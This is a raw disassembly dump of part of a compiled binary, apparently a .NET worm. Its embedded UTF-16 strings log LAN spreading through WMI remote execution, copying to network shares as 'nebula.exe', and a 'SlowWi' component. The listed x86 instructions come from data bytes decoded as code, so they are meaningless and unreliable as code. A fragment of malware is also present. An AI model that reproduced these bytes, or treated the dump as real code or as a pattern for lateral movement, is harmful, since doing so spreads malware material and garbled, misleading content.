  407abf:	00 20                	add    %ah,(%eax)
  407ac1:	00 00                	add    %al,(%eax)
  407ac3:	55                   	push   %ebp
  407ac4:	5b                   	pop    %ebx
  407ac5:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407ac9:	00 6e 00             	add    %ch,0x0(%esi)
  407acc:	53                   	push   %ebx
  407acd:	00 70 00             	add    %dh,0x0(%eax)
  407ad0:	72 00                	jb     0x407ad2
  407ad2:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407ad6:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407ada:	20 00                	and    %al,(%eax)
  407adc:	57                   	push   %edi
  407add:	00 4d 00             	add    %cl,0x0(%ebp)
  407ae0:	49                   	dec    %ecx
  407ae1:	00 20                	add    %ah,(%eax)
  407ae3:	00 72 00             	add    %dh,0x0(%edx)
  407ae6:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407aea:	6f                   	outsl  %ds:(%esi),(%dx)
  407aeb:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407aef:	00 20                	add    %ah,(%eax)
  407af1:	00 65 00             	add    %ah,0x0(%ebp)
  407af4:	78 00                	js     0x407af6
  407af6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407afa:	75 00                	jne    0x407afc
  407afc:	74 00                	je     0x407afe
  407afe:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407b04:	20 00                	and    %al,(%eax)
  407b06:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407b0a:	72 00                	jb     0x407b0c
  407b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b0d:	00 72 00             	add    %dh,0x0(%edx)
  407b10:	20 00                	and    %al,(%eax)
  407b12:	6f                   	outsl  %ds:(%esi),(%dx)
  407b13:	00 6e 00             	add    %ch,0x0(%esi)
  407b16:	20 00                	and    %al,(%eax)
  407b18:	00 05 3a 00 20 00    	add    %al,0x20003a
  407b1e:	00 3b                	add    %bh,(%ebx)
  407b20:	5b                   	pop    %ebx
  407b21:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407b25:	00 6e 00             	add    %ch,0x0(%esi)
  407b28:	53                   	push   %ebx
  407b29:	00 70 00             	add    %dh,0x0(%eax)
  407b2c:	72 00                	jb     0x407b2e
  407b2e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407b32:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407b36:	20 00                	and    %al,(%eax)
  407b38:	53                   	push   %ebx
  407b39:	00 75 00             	add    %dh,0x0(%ebp)
  407b3c:	62 00                	bound  %eax,(%eax)
  407b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b3f:	00 65 00             	add    %ah,0x0(%ebp)
  407b42:	74 00                	je     0x407b44
  407b44:	20 00                	and    %al,(%eax)
  407b46:	6e                   	outsb  %ds:(%esi),(%dx)
  407b47:	00 6f 00             	add    %ch,0x0(%edi)
  407b4a:	74 00                	je     0x407b4c
  407b4c:	20 00                	and    %al,(%eax)
  407b4e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  407b52:	75 00                	jne    0x407b54
  407b54:	6e                   	outsb  %ds:(%esi),(%dx)
  407b55:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  407b59:	00 00                	add    %al,(%eax)
  407b5b:	0f 7b                	(bad)
  407b5d:	00 30                	add    %dh,(%eax)
  407b5f:	00 7d 00             	add    %bh,0x0(%ebp)
  407b62:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  407b66:	31 00                	xor    %eax,(%eax)
  407b68:	7d 00                	jge    0x407b6a
  407b6a:	00 23                	add    %ah,(%ebx)
  407b6c:	5b                   	pop    %ebx
  407b6d:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407b71:	00 6e 00             	add    %ch,0x0(%esi)
  407b74:	53                   	push   %ebx
  407b75:	00 70 00             	add    %dh,0x0(%eax)
  407b78:	72 00                	jb     0x407b7a
  407b7a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407b7e:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407b82:	20 00                	and    %al,(%eax)
  407b84:	44                   	inc    %esp
  407b85:	00 6f 00             	add    %ch,0x0(%edi)
  407b88:	6e                   	outsb  %ds:(%esi),(%dx)
  407b89:	00 65 00             	add    %ah,0x0(%ebp)
  407b8c:	2e 00 00             	add    %al,%cs:(%eax)
  407b8f:	0f 38 00 2e          	pshufb (%esi),%mm5
  407b93:	00 38                	add    %bh,(%eax)
  407b95:	00 2e                	add    %ch,(%esi)
  407b97:	00 38                	add    %bh,(%eax)
  407b99:	00 2e                	add    %ch,(%esi)
  407b9b:	00 38                	add    %bh,(%eax)
  407b9d:	00 00                	add    %al,(%eax)
  407b9f:	33 5b 00             	xor    0x0(%ebx),%ebx
  407ba2:	53                   	push   %ebx
  407ba3:	00 70 00             	add    %dh,0x0(%eax)
  407ba6:	72 00                	jb     0x407ba8
  407ba8:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407bac:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407bb0:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb1:	00 67 00             	add    %ah,0x0(%edi)
  407bb4:	5d                   	pop    %ebp
  407bb5:	00 20                	add    %ah,(%eax)
  407bb7:	00 53 00             	add    %dl,0x0(%ebx)
  407bba:	70 00                	jo     0x407bbc
  407bbc:	72 00                	jb     0x407bbe
  407bbe:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407bc2:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407bc6:	64 00 20             	add    %ah,%fs:(%eax)
  407bc9:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  407bcd:	00 3a                	add    %bh,(%edx)
  407bcf:	00 20                	add    %ah,(%eax)
  407bd1:	00 00                	add    %al,(%eax)
  407bd3:	35 5b 00 53 00       	xor    $0x53005b,%eax
  407bd8:	70 00                	jo     0x407bda
  407bda:	72 00                	jb     0x407bdc
  407bdc:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407be0:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407be4:	6e                   	outsb  %ds:(%esi),(%dx)
  407be5:	00 67 00             	add    %ah,0x0(%edi)
  407be8:	5d                   	pop    %ebp
  407be9:	00 20                	add    %ah,(%eax)
  407beb:	00 53 00             	add    %dl,0x0(%ebx)
  407bee:	70 00                	jo     0x407bf0
  407bf0:	72 00                	jb     0x407bf2
  407bf2:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407bf6:	64 00 20             	add    %ah,%fs:(%eax)
  407bf9:	00 45 00             	add    %al,0x0(%ebp)
  407bfc:	72 00                	jb     0x407bfe
  407bfe:	72 00                	jb     0x407c00
  407c00:	6f                   	outsl  %ds:(%esi),(%dx)
  407c01:	00 72 00             	add    %dh,0x0(%edx)
  407c04:	3a 00                	cmp    (%eax),%al
  407c06:	20 00                	and    %al,(%eax)
  407c08:	00 29                	add    %ch,(%ecx)
  407c0a:	5c                   	pop    %esp
  407c0b:	00 5c 00 7b          	add    %bl,0x7b(%eax,%eax,1)
  407c0f:	00 30                	add    %dh,(%eax)
  407c11:	00 7d 00             	add    %bh,0x0(%ebp)
  407c14:	5c                   	pop    %esp
  407c15:	00 7b 00             	add    %bh,0x0(%ebx)
  407c18:	31 00                	xor    %eax,(%eax)
  407c1a:	7d 00                	jge    0x407c1c
  407c1c:	5c                   	pop    %esp
  407c1d:	00 6e 00             	add    %ch,0x0(%esi)
  407c20:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  407c24:	75 00                	jne    0x407c26
  407c26:	6c                   	insb   (%dx),%es:(%edi)
  407c27:	00 61 00             	add    %ah,0x0(%ecx)
  407c2a:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  407c2e:	78 00                	js     0x407c30
  407c30:	65 00 00             	add    %al,%gs:(%eax)
  407c33:	41                   	inc    %ecx
  407c34:	5b                   	pop    %ebx
  407c35:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  407c39:	00 6e 00             	add    %ch,0x0(%esi)
  407c3c:	53                   	push   %ebx
  407c3d:	00 70 00             	add    %dh,0x0(%eax)
  407c40:	72 00                	jb     0x407c42
  407c42:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407c46:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407c4a:	20 00                	and    %al,(%eax)
  407c4c:	53                   	push   %ebx
  407c4d:	00 75 00             	add    %dh,0x0(%ebp)
  407c50:	63 00                	arpl   %eax,(%eax)
  407c52:	63 00                	arpl   %eax,(%eax)
  407c54:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407c58:	73 00                	jae    0x407c5a
  407c5a:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  407c5e:	6c                   	insb   (%dx),%es:(%edi)
  407c5f:	00 20                	add    %ah,(%eax)
  407c61:	00 73 00             	add    %dh,0x0(%ebx)
  407c64:	70 00                	jo     0x407c66
  407c66:	72 00                	jb     0x407c68
  407c68:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407c6c:	64 00 21             	add    %ah,%fs:(%ecx)
  407c6f:	00 3a                	add    %bh,(%edx)
  407c71:	00 20                	add    %ah,(%eax)
  407c73:	00 00                	add    %al,(%eax)
  407c75:	25 5b 00 4c 00       	and    $0x4c005b,%eax
  407c7a:	61                   	popa
  407c7b:	00 6e 00             	add    %ch,0x0(%esi)
  407c7e:	53                   	push   %ebx
  407c7f:	00 70 00             	add    %dh,0x0(%eax)
  407c82:	72 00                	jb     0x407c84
  407c84:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407c88:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  407c8c:	20 00                	and    %al,(%eax)
  407c8e:	45                   	inc    %ebp
  407c8f:	00 72 00             	add    %dh,0x0(%edx)
  407c92:	72 00                	jb     0x407c94
  407c94:	6f                   	outsl  %ds:(%esi),(%dx)
  407c95:	00 72 00             	add    %dh,0x0(%edx)
  407c98:	20 00                	and    %al,(%eax)
  407c9a:	00 07                	add    %al,(%edi)
  407c9c:	20 00                	and    %al,(%eax)
  407c9e:	2d 00 20 00 01       	sub    $0x1002000,%eax
  407ca3:	3b 5b 00             	cmp    0x0(%ebx),%ebx
  407ca6:	53                   	push   %ebx
  407ca7:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  407cab:	00 77 00             	add    %dh,0x0(%edi)
  407cae:	57                   	push   %edi
  407caf:	00 69 00             	add    %ch,0x0(%ecx)
  407cb2:	5d                   	pop    %ebp
  407cb3:	00 20                	add    %ah,(%eax)
  407cb5:	00 53 00             	add    %dl,0x0(%ebx)
  407cb8:	74 00                	je     0x407cba
  407cba:	61                   	popa
  407cbb:	00 72 00             	add    %dh,0x0(%edx)
  407cbe:	74 00                	je     0x407cc0
  407cc0:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  407cc5:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  407cc9:	00 6d 00             	add    %ch,0x0(%ebp)
  407ccc:	65 00 3a             	add    %bh,%gs:(%edx)
  407ccf:	00 20                	add    %ah,(%eax)
  407cd1:	00 7b 00             	add    %bh,0x0(%ebx)
  407cd4:	30 00                	xor    %al,(%eax)
  407cd6:	7d 00                	jge    0x407cd8
  407cd8:	20 00                	and    %al,(%eax)
  407cda:	73 00                	jae    0x407cdc
  407cdc:	6e                   	outsb  %ds:(%esi),(%dx)
  407cdd:	00 00                	add    %al,(%eax)
  407cdf:	1f                   	pop    %ds
  407ce0:	5b                   	pop    %ebx
  407ce1:	00 53 00             	add    %dl,0x0(%ebx)
  407ce4:	6c                   	insb   (%dx),%es:(%edi)
  407ce5:	00 6f 00             	add    %ch,0x0(%edi)
  407ce8:	77 00                	ja     0x407cea
  407cea:	57                   	push   %edi
  407ceb:	00 69 00             	add    %ch,0x0(%ecx)
  407cee:	5d                   	pop    %ebp
  407cef:	00 20                	add    %ah,(%eax)
  407cf1:	00 43 00             	add    %al,0x0(%ebx)
  407cf4:	6c                   	insb   (%dx),%es:(%edi)
  407cf5:	00 6f 00             	add    %ch,0x0(%edi)
  407cf8:	73 00                	jae    0x407cfa
  407cfa:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407cff:	21 5b 00             	and    %ebx,0x0(%ebx)
  407d02:	53                   	push   %ebx
  407d03:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  407d07:	00 77 00             	add    %dh,0x0(%edi)
  407d0a:	57                   	push   %edi
  407d0b:	00 69 00             	add    %ch,0x0(%ecx)
  407d0e:	5d                   	pop    %ebp
  407d0f:	00 20                	add    %ah,(%eax)
  407d11:	00 45 00             	add    %al,0x0(%ebp)
  407d14:	72 00                	jb     0x407d16
  407d16:	72 00                	jb     0x407d18
  407d18:	6f                   	outsl  %ds:(%esi),(%dx)
  407d19:	00 72 00             	add    %dh,0x0(%edx)
  407d1c:	3a 00                	cmp    (%eax),%al
  407d1e:	20 00                	and    %al,(%eax)
  407d20:	00 27                	add    %ah,(%edi)
  407d22:	5b                   	pop    %ebx
  407d23:	00 53 00             	add    %dl,0x0(%ebx)
  407d26:	70 00                	jo     0x407d28
  407d28:	72 00                	jb     0x407d2a
  407d2a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  407d2e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407d32:	6e                   	outsb  %ds:(%esi),(%dx)
  407d33:	00 67 00             	add    %ah,0x0(%edi)
  407d36:	5d                   	pop    %ebp
  407d37:	00 20                	add    %ah,(%eax)
  407d39:	00 45 00             	add    %al,0x0(%ebp)
  407d3c:	72 00                	jb     0x407d3e
  407d3e:	72 00                	jb     0x407d40
  407d40:	6f                   	outsl  %ds:(%esi),(%dx)
  407d41:	00 72 00             	add    %dh,0x0(%edx)
  407d44:	3a 00                	cmp    (%eax),%al
  407d46:	20 00                	and    %al,(%eax)
  407d48:	00 00                	add    %al,(%eax)
  407d4a:	00 00                	add    %al,(%eax)
  407d4c:	20 5a 63             	and    %bl,0x63(%edx)
  407d4f:	65 2f                	gs das
  407d51:	ac                   	lods   %ds:(%esi),%al
  407d52:	8b 43 aa             	mov    -0x56(%ebx),%eax
  407d55:	b9 41 1d 88 bb       	mov    $0xbb881d41,%ecx
  407d5a:	bc 97 00 04 20       	mov    $0x20040097,%esp
  407d5f:	01 01                	add    %eax,(%ecx)
  407d61:	08 03                	or     %al,(%ebx)
  407d63:	20 00                	and    %al,(%eax)
  407d65:	01 05 20 01 01 11    	add    %eax,0x11010120
  407d6b:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  407d6e:	01 01                	add    %eax,(%ecx)
  407d70:	0e                   	push   %cs
  407d71:	04 20                	add    $0x20,%al
  407d73:	01 01                	add    %eax,(%ecx)
  407d75:	02 05 20 01 01 11    	add    0x11010120,%al
  407d7b:	41                   	inc    %ecx
  407d7c:	05 20 01 01 12       	add    $0x12010120,%eax
  407d81:	71 06                	jno    0x407d89
  407d83:	20 01                	and    %al,(%ecx)
  407d85:	01 12                	add    %edx,(%edx)
  407d87:	80 c1 03             	add    $0x3,%cl
  407d8a:	00 00                	add    %al,(%eax)
  407d8c:	02 09                	add    (%ecx),%cl
  407d8e:	07                   	pop    %es
  407d8f:	05 12 51 12 59       	add    $0x59125112,%eax
  407d94:	0e                   	push   %cs
  407d95:	0e                   	push   %cs
  407d96:	02 04 20             	add    (%eax,%eiz,1),%al
  407d99:	00 12                	add    %dl,(%edx)
  407d9b:	55                   	push   %ebp
  407d9c:	04 20                	add    $0x20,%al
  407d9e:	00 12                	add    %dl,(%edx)
  407da0:	59                   	pop    %ecx
  407da1:	05 20 00 12 80       	add    $0x80120020,%eax
  407da6:	b5 04                	mov    $0x4,%ch
  407da8:	20 01                	and    %al,(%ecx)
  407daa:	1c 0e                	sbb    $0xe,%al
  407dac:	03 20                	add    (%eax),%esp
  407dae:	00 0e                	add    %cl,(%esi)
  407db0:	04 20                	add    $0x20,%al
  407db2:	01 02                	add    %eax,(%edx)
  407db4:	0e                   	push   %cs
  407db5:	03 20                	add    (%eax),%esp
  407db7:	00 02                	add    %al,(%edx)
  407db9:	0b 07                	or     (%edi),%eax
  407dbb:	05 1d 12 5d 08       	add    $0x85d121d,%eax
  407dc0:	12 5d 12             	adc    0x12(%ebp),%bl
  407dc3:	2c 02                	sub    $0x2,%al
  407dc5:	05 00 00 1d 12       	add    $0x121d0000,%eax
  407dca:	5d                   	pop    %ebp
  407dcb:	07                   	pop    %es
  407dcc:	15 12 81 15 02       	adc    $0x2158112,%eax
  407dd1:	0e                   	push   %cs
  407dd2:	02 05 20 02 01 1c    	add    0x1c010220,%al
  407dd8:	18 13                	sbb    %dl,(%ebx)
  407dda:	10 01                	adc    %al,(%ecx)
  407ddc:	02 02                	add    (%edx),%al
  407dde:	15 12 81 1d 01       	adc    $0x11d8112,%eax
  407de3:	1e                   	push   %ds
  407de4:	00 15 12 81 15 02    	add    %dl,0x2158112
  407dea:	1e                   	push   %ds
  407deb:	00 02                	add    %al,(%edx)
  407ded:	03 0a                	add    (%edx),%ecx
  407def:	01 0e                	add    %ecx,(%esi)
  407df1:	06                   	push   %es
  407df2:	07                   	pop    %es
  407df3:	03 12                	add    (%edx),%edx
  407df5:	61                   	popa
  407df6:	1c 02                	sbb    $0x2,%al
  407df8:	03 06                	add    (%esi),%eax
  407dfa:	12 61 05             	adc    0x5(%ecx),%ah
  407dfd:	20 01                	and    %al,(%ecx)
  407dff:	12 61 0e             	adc    0xe(%ecx),%ah
  407e02:	03 07                	add    (%edi),%eax
  407e04:	01 02                	add    %eax,(%edx)
  407e06:	05 00 00 12 81       	add    $0x81120000,%eax
  407e0b:	29 04 00             	sub    %eax,(%eax,%eax,1)
  407e0e:	01 01                	add    %eax,(%ecx)
  407e10:	08 03                	or     %al,(%ebx)
  407e12:	20 00                	and    %al,(%eax)
  407e14:	0a 09                	or     (%ecx),%cl
  407e16:	07                   	pop    %es
  407e17:	06                   	push   %es
  407e18:	0e                   	push   %cs
  407e19:	0e                   	push   %cs
  407e1a:	1d 0e 08 0e 0e       	sbb    $0xe0e080e,%eax
  407e1f:	04 00                	add    $0x0,%al
  407e21:	00 12                	add    %dl,(%edx)
  407e23:	5d                   	pop    %ebp
  407e24:	05 20 00 12 81       	add    $0x81120020,%eax
  407e29:	31 05 00 02 0e 0e    	xor    %eax,0xe0e0200
  407e2f:	0e                   	push   %cs
  407e30:	04 00                	add    $0x0,%al
  407e32:	01 02                	add    %eax,(%edx)
  407e34:	0e                   	push   %cs
  407e35:	03 07                	add    (%edi),%eax
  407e37:	01 0e                	add    %ecx,(%esi)
  407e39:	06                   	push   %es
  407e3a:	00 01                	add    %al,(%ecx)
  407e3c:	0e                   	push   %cs
  407e3d:	11 81 41 07 07 04    	adc    %eax,0x4070741(%ecx)
  407e43:	0e                   	push   %cs
  407e44:	0e                   	push   %cs
  407e45:	0e                   	push   %cs
  407e46:	11 69 04             	adc    %ebp,0x4(%ecx)
  407e49:	00 01                	add    %al,(%ecx)
  407e4b:	0e                   	push   %cs
  407e4c:	0e                   	push   %cs
  407e4d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  407e52:	0e                   	push   %cs
  407e53:	03 00                	add    (%eax),%eax
  407e55:	00 0e                	add    %cl,(%esi)
  407e57:	04 00                	add    $0x0,%al
  407e59:	00 11                	add    %dl,(%ecx)
  407e5b:	69 04 20 01 0e 0e 06 	imul   $0x60e0e01,(%eax,%eiz,1),%eax
  407e62:	00 03                	add    %al,(%ebx)
  407e64:	0e                   	push   %cs
  407e65:	0e                   	push   %cs
  407e66:	0e                   	push   %cs
  407e67:	0e                   	push   %cs
  407e68:	05 00 02 01 0e       	add    $0xe010200,%eax
  407e6d:	0e                   	push   %cs
  407e6e:	06                   	push   %es
  407e6f:	00 02                	add    %al,(%edx)
  407e71:	12 5d 0e             	adc    0xe(%ebp),%bl
  407e74:	0e                   	push   %cs
  407e75:	04 00                	add    $0x0,%al
  407e77:	01 01                	add    %eax,(%ecx)
  407e79:	0e                   	push   %cs
  407e7a:	04 07                	add    $0x7,%al
  407e7c:	01 11                	add    %edx,(%ecx)
  407e7e:	44                   	inc    %esp
  407e7f:	05 00 00 11 80       	add    $0x80110000,%eax
  407e84:	d5 07                	aad    $0x7
  407e86:	30 01                	xor    %al,(%ecx)
  407e88:	01 01                	add    %eax,(%ecx)
  407e8a:	10 1e                	adc    %bl,(%esi)
  407e8c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  407e8f:	01 11                	add    %edx,(%ecx)
  407e91:	44                   	inc    %esp
  407e92:	04 20                	add    $0x20,%al
  407e94:	00 12                	add    %dl,(%edx)
  407e96:	79 16                	jns    0x407eae
  407e98:	07                   	pop    %es
  407e99:	09 12                	or     %edx,(%edx)
  407e9b:	7d 08                	jge    0x407ea5
  407e9d:	12 80 81 12 80 85    	adc    -0x7a7fed7f(%eax),%al
  407ea3:	12 80 89 12 80 8d    	adc    -0x727fed77(%eax),%al
  407ea9:	0e                   	push   %cs
  407eaa:	0e                   	push   %cs
  407eab:	12 80 91 04 06 12    	adc    0x12060491(%eax),%al
  407eb1:	80 95 07 20 02 01 12 	adcb   $0x12,0x1022007(%ebp)
  407eb8:	80 95 08 05 20 00 12 	adcb   $0x12,0x200508(%ebp)
  407ebf:	80 81 05 20 00 12 80 	addb   $0x80,0x12002005(%ecx)
  407ec6:	85 05 00 00 12 81    	test   %eax,0x81120000
  407ecc:	4d                   	dec    %ebp
  407ecd:	09 20                	or     %esp,(%eax)
  407ecf:	02 01                	add    (%ecx),%al
  407ed1:	12 81 51 12 81 4d    	adc    0x4d811251(%ecx),%al
  407ed7:	0a 07                	or     (%edi),%al
  407ed9:	05 12 5d 0e 0e       	add    $0xe0e5d12,%eax
  407ede:	0e                   	push   %cs
  407edf:	12 80 91 05 20 02    	adc    0x2200591(%eax),%al
  407ee5:	01 0e                	add    %ecx,(%esi)
  407ee7:	0e                   	push   %cs
  407ee8:	07                   	pop    %es
  407ee9:	00 01                	add    %al,(%ecx)
  407eeb:	12 5d 12             	adc    0x12(%ebp),%bl
  407eee:	81 5d 05 20 00 12 80 	sbbl   $0x80120020,0x5(%ebp)
  407ef5:	89 10                	mov    %edx,(%eax)
  407ef7:	07                   	pop    %es
  407ef8:	06                   	push   %es
  407ef9:	1d 12 80 95 08       	sbb    $0x8958012,%eax
  407efe:	12 80 95 1d 0e 0e    	adc    0xe0e1d95(%eax),%al
  407f04:	12 80 91 06 00 01    	adc    0x1000691(%eax),%al
  407f0a:	12 81 65 0e 06 20    	adc    0x20060e65(%ecx),%al
  407f10:	00 1d 12 80 95 05    	add    %bl,0x5958012
  407f16:	20 00                	and    %al,(%eax)
  407f18:	11 81 69 06 20 01    	adc    %eax,0x1200669(%ecx)
  407f1e:	1d 0e 1d 03 07       	sbb    $0x7031d0e,%eax
  407f23:	00 04 0e             	add    %al,(%esi,%ecx,1)
  407f26:	0e                   	push   %cs
  407f27:	1c 1c                	sbb    $0x1c,%al
  407f29:	1c 09                	sbb    $0x9,%al
  407f2b:	07                   	pop    %es
  407f2c:	03 12                	add    (%edx),%edx
  407f2e:	80 99 12 80 9d 02 07 	sbbb   $0x7,0x29d8012(%ecx)
  407f35:	20 02                	and    %al,(%edx)
  407f37:	12 80 9d 0e 08 05    	adc    0x5080e9d(%eax),%al
  407f3d:	20 00                	and    %al,(%eax)
  407f3f:	11 81 71 04 07 01    	adc    %eax,0x1070471(%ecx)
  407f45:	11 40 06             	adc    %eax,0x6(%eax)
  407f48:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  407f4d:	02 09                	add    (%ecx),%cl
  407f4f:	00 00                	add    %al,(%eax)
  407f51:	15 11 80 dd 01       	adc    $0x1dd8011,%eax
  407f56:	13 00                	adc    (%eax),%eax
  407f58:	04 0a                	add    $0xa,%al
  407f5a:	01 11                	add    %edx,(%ecx)
  407f5c:	40                   	inc    %eax
  407f5d:	09 20                	or     %esp,(%eax)
  407f5f:	00 15 12 80 a1 01    	add    %dl,0x1a18012
  407f65:	13 00                	adc    (%eax),%eax
  407f67:	04 07                	add    $0x7,%al
  407f69:	01 11                	add    %edx,(%ecx)
  407f6b:	48                   	dec    %eax
  407f6c:	04 0a                	add    $0xa,%al
  407f6e:	01 11                	add    %edx,(%ecx)
  407f70:	48                   	dec    %eax
  407f71:	06                   	push   %es
  407f72:	20 01                	and    %al,(%ecx)
  407f74:	01 12                	add    %edx,(%edx)
  407f76:	80 e5 06             	and    $0x6,%ch
  407f79:	07                   	pop    %es
  407f7a:	03 08                	add    (%eax),%ecx
  407f7c:	1d 03 08 05 20       	sbb    $0x20050803,%eax
  407f81:	02 08                	add    (%eax),%cl
  407f83:	08 08                	or     %cl,(%eax)
  407f85:	03 20                	add    (%eax),%esp
  407f87:	00 08                	add    %cl,(%eax)
  407f89:	04 20                	add    $0x20,%al
  407f8b:	01 08                	add    %ecx,(%eax)
  407f8d:	08 04 20             	or     %al,(%eax,%eiz,1)
  407f90:	01 03                	add    %eax,(%ebx)
  407f92:	08 05 20 01 01 1d    	or     %al,0x1d010120
  407f98:	03 02                	add    (%edx),%eax
  407f9a:	06                   	push   %es
  407f9b:	0e                   	push   %cs
  407f9c:	07                   	pop    %es
  407f9d:	00 02                	add    %al,(%edx)
  407f9f:	01 0e                	add    %ecx,(%esi)
  407fa1:	11 81 75 04 07 01    	adc    %eax,0x1070475(%ecx)
  407fa7:	12 61 06             	adc    0x6(%ecx),%ah
  407faa:	20 02                	and    %al,(%edx)
  407fac:	12 61 0e             	adc    0xe(%ecx),%ah
  407faf:	02 05 20 02 01 0e    	add    0xe010220,%al
  407fb5:	1c 04                	sbb    $0x4,%al
  407fb7:	07                   	pop    %es
  407fb8:	02 0e                	add    (%esi),%cl
  407fba:	0e                   	push   %cs
  407fbb:	06                   	push   %es
  407fbc:	20 01                	and    %al,(%ecx)
  407fbe:	01 11                	add    %edx,(%ecx)
  407fc0:	81 79 0a 07 06 0e 1d 	cmpl   $0x1d0e0607,0xa(%ecx)
  407fc7:	0e                   	push   %cs
  407fc8:	08 1d 0e 08 0e 06    	or     %bl,0x60e080e
  407fce:	00 02                	add    %al,(%edx)
  407fd0:	1d 0e 0e 0e 07       	sbb    $0x70e0e0e,%eax
  407fd5:	20 02                	and    %al,(%edx)
  407fd7:	02 0e                	add    (%esi),%cl
  407fd9:	11 81 7d 05 00 00    	adc    %eax,0x57d(%ecx)
  407fdf:	12 81 81 06 20 01    	adc    0x1200681(%ecx),%al
  407fe5:	01 12                	add    %edx,(%edx)
  407fe7:	81 81 06 20 01 02 11 	addl   $0xa898111,0x2012006(%ecx)
  407fee:	81 89 0a 
  407ff1:	07                   	pop    %es
  407ff2:	05 0e 1d 0e 08       	add    $0x80e1d0e,%eax
  407ff7:	0e                   	push   %cs
  407ff8:	12 80 ed 05 00 01    	adc    0x10005ed(%eax),%al
  407ffe:	12 5d 0e             	adc    0xe(%ebp),%bl
  408001:	06                   	push   %es
  408002:	00 03                	add    %al,(%ebx)
  408004:	01 0e                	add    %ecx,(%esi)
  408006:	0e                   	push   %cs
  408007:	02 05 20 01 0e 1d    	add    0x1d0e0120,%al
  40800d:	03 08                	add    (%eax),%ecx
  40800f:	00 03                	add    %al,(%ebx)
  408011:	02 0e                	add    (%esi),%cl
  408013:	0e                   	push   %cs
  408014:	11 81 7d 07 15 12    	adc    %eax,0x1215077d(%ecx)
  40801a:	80 f5 01             	xor    $0x1,%ch
  40801d:	12 79 05             	adc    0x5(%ecx),%bh
  408020:	20 00                	and    %al,(%eax)
  408022:	11 81 01 0e 00 02    	adc    %eax,0x2000e01(%ecx)
  408028:	12 79 15             	adc    0x15(%ecx),%bh
  40802b:	12 80 f5 01 12 79    	adc    0x791201f5(%eax),%al
  408031:	11 81 01 04 07 01    	adc    %eax,0x1070401(%ecx)
  408037:	11 54 04 0a          	adc    %edx,0xa(%esp,%eax,1)
  40803b:	01 11                	add    %edx,(%ecx)
  40803d:	54                   	push   %esp
  40803e:	06                   	push   %es
  40803f:	00 01                	add    %al,(%ecx)
  408041:	01 11                	add    %edx,(%ecx)
  408043:	81 8d 03 00 00 01 04 	orl    $0x11010704,0x1000003(%ebp)
  40804a:	07 01 11 
  40804d:	60                   	pusha
  40804e:	04 0a                	add    $0xa,%al
  408050:	01 11                	add    %edx,(%ecx)
  408052:	60                   	pusha
  408053:	08 07                	or     %al,(%edi)
  408055:	04 1d                	add    $0x1d,%al
  408057:	03 12                	add    (%edx),%edx
  408059:	6d                   	insl   (%dx),%es:(%edi)
  40805a:	02 08                	add    (%eax),%cl
  40805c:	06                   	push   %es
  40805d:	00 02                	add    %al,(%edx)
  40805f:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  408062:	02 04 00             	add    (%eax,%eax,1),%al
  408065:	01 01                	add    %eax,(%ecx)
  408067:	1c 11                	sbb    $0x11,%al
  408069:	07                   	pop    %es
  40806a:	08 0e                	or     %cl,(%esi)
  40806c:	1d 12 81 05 08       	sbb    $0x8058112,%eax
  408071:	12 81 05 0e 0e 0e    	adc    0xe0e0e05(%ecx),%al
  408077:	12 80 91 06 00 00    	adc    0x691(%eax),%al
  40807d:	1d 12 81 05 05       	sbb    $0x5058112,%eax
  408082:	20 00                	and    %al,(%eax)
  408084:	11 81 95 05 20 00    	adc    %eax,0x200595(%ecx)
  40808a:	12 81 99 09 07 04    	adc    0x4070999(%ecx),%al
  408090:	0e                   	push   %cs
  408091:	0e                   	push   %cs
  408092:	11 69 12             	adc    %ebp,0x12(%ecx)
